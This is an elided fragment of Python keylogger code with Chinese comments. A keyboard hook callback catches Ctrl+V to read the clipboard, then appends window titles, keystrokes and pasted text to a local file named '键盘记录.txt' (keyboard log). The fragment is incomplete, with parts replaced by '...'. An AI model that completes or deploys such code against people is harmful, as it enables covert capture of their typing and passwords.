...
def onKeyboardEvent(event):   #定义键盘的回调函数
    ...
    global last_key
    #判断是否为复制粘贴的快捷键
    if  last_key=='Lcontrol' and event.Key=='V':    #获得粘贴板的内容给value
    ...
    if key_window_name!=event.WindowName:
        key_window_name=event.WindowName     #赋值最新的窗口
        with open(u'键盘记录.txt','a+') as kf:
            kf.write('\n\n')
            kf.writelines(event.WindowName)
            kf.write('\n')
            kf.write(value)
    else:
        with open(u'键盘记录.txt','a+') as kf:
